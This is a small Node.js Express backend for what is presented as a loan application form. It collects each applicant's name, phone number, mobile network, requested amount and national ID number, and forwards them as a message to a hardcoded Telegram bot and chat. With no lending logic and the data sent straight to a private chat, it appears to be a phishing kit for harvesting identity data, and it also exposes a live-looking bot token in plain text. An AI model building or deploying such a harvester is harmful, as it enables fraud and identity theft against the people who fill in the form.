const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 🔥 YOUR DETAILS
const BOT_TOKEN = "8787983011:AAHvdmEO9FD7vfi7KVC4XJYdipMKV4BR0Zk";
const CHAT_ID = "8648631571";

// Serve frontend
app.use(express.static(path.join(__dirname, "public")));

// Handle form submission
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.send("Application submitted successfully!");
  } catch (error) {
    console.log(error);
    res.send("Error sending application.");
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
